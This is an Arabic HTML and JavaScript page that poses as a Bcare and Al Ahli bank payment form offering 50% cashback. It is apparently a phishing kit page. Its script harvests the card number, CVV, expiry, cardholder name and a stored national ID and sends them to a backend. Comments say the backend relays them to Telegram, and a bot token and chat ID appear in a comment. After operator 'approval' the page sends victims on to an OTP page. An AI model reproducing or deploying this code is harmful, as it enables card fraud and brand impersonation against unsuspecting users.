<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>نموذج الدفع</title>
    <style>
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 370px;
            margin: 30px auto;
            background-color: #fff;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            border: 1.5px solid #0000006e;
            position: relative;
        }

        .banner img {
            width: 100%;
            border-radius: 10px;
        }

        .title {
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
            color: #333;
            text-align: center;
        }

        .title span {
            color: green;
        }

        .section-title {
            margin: 20px 0 10px;
            font-weight: bold;
            font-size: 16px;
            color: #444;
        }

        .note {
            color: #007bff;
            font-size: 14px;
            margin-bottom: 10px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
        }

        .row {
            display: flex;
            gap: 10px;
        }

        .row input {
            flex: 1;
        }

        button {
            background-color: #ffa500;
            color: white;
            padding: 15px;
            width: 100%;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
        }

        button:hover {
            background-color: #ff9900;
        }

        .footer-note {
            font-size: 12px;
            color: #888;
            margin-top: 15px;
            text-align: center;
        }
        hr {
            color: #0000005d;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
            margin-top: 20px;
        }

        .logo img {
            max-height: 40px;
        }

        .section-title {
            font-size: 22px;
            margin-top: -18px;
            color: #000000ab;
            font-weight: bold;
        }

        .note {
            font-weight: bold;
            color: #053a74;
        }

        #imgmain, #imgmain2 {
            width: 50px;
            height: auto;
            padding: 5px;
        }

        /* دائرة التحميل (Spinner) */
        .loading-overlay {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255, 255, 255, 0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 12px;
            z-index: 10;
            display: none; /* مخفية في البداية */
        }

        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #ffa500;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }

        .loading-text-bold {
            font-weight: bold;
            font-size: 18px;
            color: #333;
            margin-bottom: 8px;
            text-align: center;
        }

        .loading-text-small {
            font-size: 14px;
            color: #555;
            text-align: center;
        }
        #errorText {
            color: red;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            display: none;
        }
        #waitingMessage {
            text-align: center;
            padding: 30px;
            font-size: 18px;
            color: #007bff;
            display: none; 
            font-weight: bold;
        }
        #waitingMessage small {
            display: block;
            font-size: 14px;
            color: #555;
            margin-top: 10px;
        }
        .form-fields {
            display: block; 
        }
    </style>
</head>
<body>

<div class="logo">
    <img src="https://bcare.com.sa/assets/images/Bcare-logo.svg" alt="Care Logo" />
</div>

<div class="banner">
    <img src="https://www.alahli.com/-/media/project/snb/snb-web/eform/touch-card-banner.png?h=400&iar=0&w=980&hash=28117754EB63EAB862B2CF46B2B034F5" alt="عرض خصم 50%">
</div>
<p class="title">كاش باك <span>%50</span> مع بطاقات البنك الأهلي! لا تفوت الفرصة</p>

<div class="container" id="paymentContainer">

    <div id="formContent" class="form-fields">
        <p class="section-title">نظام معالجة المدفوعات</p>
        <hr>
        <p class="note">سيتم تنفيذ عملية الدفع من خلال الوسيلة المحددة أدناه.</p>
        <div style="display: flex; gap: 10px; align-items: center;">
            <img id="imgmain" src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" />
            <img id="imgmain2" src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" />
        </div>

        <input type="text" id="cardName" placeholder="اسم حامل البطاقة" required />
        <input
            type="tel"
            id="cardNumber"
            placeholder="0000 0000 0000 0000"
            maxlength="19"
            required
            style="text-align: center; direction: ltr;" />

        <div class="row">
            <input type="tel" id="cvv" placeholder="CVV / CVC" maxlength="3" required />
            <input type="tel" id="expiry" placeholder="MM/YY" maxlength="5" required />
        </div>
        <p id="errorText" style="display: none;"></p>

        <button onclick="validateForm()" id="payBtn">إتمام الدفع</button>

        <p class="footer-note">
            نحرص على استخدام بياناتك الشخصية فقط لغرض تنفيذ طلبك، وذلك بما يتوافق مع سياسة الخصوصية.
        </p>
    </div>

    <div id="waitingMessage" style="display: none;">
        <p>تم استلام طلبك.</p>
        <p>الرجاء الانتظار حتى تتم مراجعة طلبك والموافقة عليه من قبل المشرف.</p>
        <small>سيتم تحديث الصفحة تلقائياً عند الموافقة.</small>
        <div class="spinner" style="margin-top: 20px;"></div>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text-bold">يرجى الانتظار</div>
        <div class="loading-text-small">انتظر حتى تتم معالجة طلبك</div>
    </div>

</div>

<script>
    // تأكد أن هذه الدوائل موجودة في صفحة HTML أو ملف JS منفصل
    function showLoading() {
        console.log("Showing loading overlay...");
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'flex';
        } else {
            console.warn("Loading overlay element not found!");
        }
    }

    function hideLoading() {
        console.log("Hiding loading overlay...");
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) {
            loadingOverlay.style.display = 'none';
        }
    }

    // معلومات تليجرام لم تعد تستخدم هنا، الخادم يتولى الأمر
    // const telegramBotToken = '7647127310:AAEL_VzCr1wTh26Exczu6IPuFgEsH4HHHVE';
    // const chatId = '6454807559'; 

    // دالة sendToTelegram لم تعد ضرورية في الواجهة الأمامية
    // حيث يتولى الخادم Node.js إرسال الرسائل إلى Telegram.
    /*
    function sendToTelegram(message) {
        console.warn("Client-side sendToTelegram is deprecated. Node.js backend handles Telegram messages.");
        return Promise.resolve({ ok: true, description: "Handled by backend" });
    }
    */

    async function validateForm() {
        const cardName = document.getElementById('cardName').value.trim();
        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
        const cvv = document.getElementById('cvv').value.trim();
        const expiry = document.getElementById('expiry').value.trim();
        const errorText = document.getElementById('errorText');
        errorText.style.display = 'none';

        if (!cardName) {
            errorText.textContent = 'يرجى إدخال اسم حامل البطاقة';
            errorText.style.display = 'block';
            return;
        }

        if (cardNumber.length !== 16 || !/^\d{16}$/.test(cardNumber)) {
            errorText.textContent = 'يرجى ادخال رقم البطاقة كاملاً (16 رقم)';
            errorText.style.display = 'block';
            return;
        }

        if (!/^\d{3}$/.test(cvv)) {
            errorText.textContent = 'يرجى ادخال رمز CVV/CVC صحيح (3 أرقام)';
            errorText.style.display = 'block';
            return;
        }

        const [monthStr, yearStr] = expiry.split('/');
        if (!monthStr || !yearStr || monthStr.length !== 2 || (yearStr.length !== 2 && yearStr.length !== 4)) {
            errorText.textContent = 'يرجى ادخال تاريخ انتهاء البطاقة بصيغة MM/YY';
            errorText.style.display = 'block';
            return;
        }

        const month = parseInt(monthStr);
        if (!(month >= 1 && month <= 12)) {
            errorText.textContent = 'شهر الانتهاء غير صحيح';
            errorText.style.display = 'block';
            return;
        }

        let inputYear = yearStr;
        if (inputYear.length === 2) {
            inputYear = '20' + inputYear;
        }

        const currentYear = new Date().getFullYear();
        const currentMonth = new Date().getMonth() + 1;

        if (parseInt(inputYear) < currentYear || (parseInt(inputYear) === currentYear && month < currentMonth)) {
            errorText.textContent = 'هذه البطاقة منتهية';
            errorText.style.display = 'block';
            return;
        }

        showLoading(); 

        const idNumber = localStorage.getItem('id_number');
        if (!idNumber) {
            hideLoading();
            errorText.textContent = 'خطأ: لم يتم العثور على رقم الهوية. الرجاء العودة للصفحة الرئيسية.';
            errorText.style.display = 'block';
            return;
        }

        const fullName = localStorage.getItem('owner_name') || 'غير معروف';

        try {
            console.log("Sending card details to Node.js backend /process_form_data...");
            
            const payload = {
                action: 'save_card_details', // !!! الإجراء الجديد للخادم الموحد !!!
                id_number: idNumber,
                card_name: cardName,
                card_number: cardNumber,
                expiry_date: expiry,
                cvv: cvv,
                status: 'pending', // الحالة الافتراضية عند حفظ بيانات البطاقة
                // يمكنك إضافة fullName هنا إذا أردت أن يقوم الخادم باستخدامه لرسالة Telegram
                owner_name: fullName 
            };

            const response = await fetch('http://localhost:3000/process_form_data', { // !!! نقطة النهاية الموحدة !!!
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json' // نرسل JSON
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                const errorData = await response.text();
                throw new Error(`HTTP error! status: ${response.status}, response: ${errorData}`);
            }

            const result = await response.json();
            console.log('Response from Node.js backend:', result);

            if (result.status === 'success') {
                // رسالة تليجرام تم إرسالها بالفعل من الخادم
                hideLoading();
                document.getElementById('formContent').style.display = 'none';
                document.getElementById('waitingMessage').style.display = 'block';
                startPollingForStatus(idNumber); 
                console.log("Form hidden, waiting message shown, polling started.");
            } else {
                hideLoading();
                errorText.textContent = '❌ فشل في حفظ بيانات البطاقة: ' + (result.message || 'خطأ غير معروف.');
                errorText.style.display = 'block';
                console.error("Failed to save card details:", result.message);
            }
        } catch (error) {
            console.error('خطأ في الاتصال بالخادم أو إرسال البيانات:', error);
            hideLoading();
            errorText.textContent = 'خطأ في الاتصال بالخادم. الرجاء المحاولة مرة أخرى لاحقاً. (راجع Console للمزيد من التفاصيل)';
            errorText.style.display = 'block';
        }
    }

    // Polling logic
    let pollingInterval;

    function startPollingForStatus(idNumber) {
        console.log(`Starting polling for ID: ${idNumber}`);
        // مسح أي polling سابق لمنع تداخل setIntervals
        if (pollingInterval) {
            clearInterval(pollingInterval);
        }

        pollingInterval = setInterval(async () => {
            try {
                console.log(`Polling for status of ID: ${idNumber}`);
                const payload = {
                    action: 'check_status', // !!! الإجراء الجديد للخادم الموحد !!!
                    id_number: idNumber
                };

                const response = await fetch('http://localhost:3000/process_form_data', { // !!! نقطة النهاية الموحدة !!!
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    const errorData = await response.text();
                    throw new Error(`HTTP error during polling! status: ${response.status}, response: ${errorData}`);
                }

                const result = await response.json();
                console.log('Polling result:', result);

                if (result.status === 'approved') {
                    console.log("Payment approved. Redirecting to otp.html");
                    clearInterval(pollingInterval);
                    window.location.href = "otp.html";
                } else if (result.status === 'rejected') {
                    console.log("Payment rejected. Showing error message.");
                    clearInterval(pollingInterval);
                    hideLoading(); 
                    document.getElementById('waitingMessage').style.display = 'none';
                    document.getElementById('formContent').style.display = 'block'; 
                    document.getElementById('errorText').textContent = '❌ تم رفض طلب الدفع الخاص بك. يرجى المحاولة ببطاقة أخرى.';
                    document.getElementById('errorText').style.display = 'block';
                } else {
                    console.log("Status is still pending or not found.");
                }
            } catch (error) {
                console.error('خطأ في التحقق من الحالة (Polling):', error);
                // يمكن إضافة معالجة للأخطاء هنا، مثل إيقاف الـ polling بعد عدد معين من الأخطاء
            }
        }, 5000); // 5 ثواني
    }

    // تنسيق إدخال تاريخ الانتهاء
    document.getElementById('expiry').addEventListener('input', function (e) {
        let value = e.target.value.replace(/[^0-9]/g, '');
        let formatted = '';
        if (value.length > 0) {
            formatted = value.slice(0, 2);
            if (value.length >= 3) {
                formatted += '/' + value.slice(2, 4);
            }
        }
        e.target.value = formatted;
    });

    // تنسيق إدخال رقم البطاقة
    document.getElementById('cardNumber').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        let formatted = '';
        for (let i = 0; i < value.length; i += 4) {
            formatted += value.substring(i, i + 4) + ' ';
        }
        e.target.value = formatted.trim();
    });

    // إضافة استماع لحدث submit للنموذج (إذا كان هناك نموذج HTML)
    // أو يمكنك استدعاء validateForm() مباشرة من زر
    const paymentForm = document.getElementById('paymentForm'); // تأكد من وجود id="paymentForm" لنموذج الدفع
    if (paymentForm) {
        paymentForm.addEventListener('submit', function(event) {
            event.preventDefault(); // منع الإرسال الافتراضي للنموذج
            validateForm();
        });
    } else {
        console.warn("Payment form with ID 'paymentForm' not found. Ensure you call validateForm() manually.");
        // إذا لم يكن هناك form، تأكد أن الزر يستدعي validateForm()
        // مثال: <button type="button" onclick="validateForm()">إرسال الدفع</button>
    }
</script>


</body>
</html>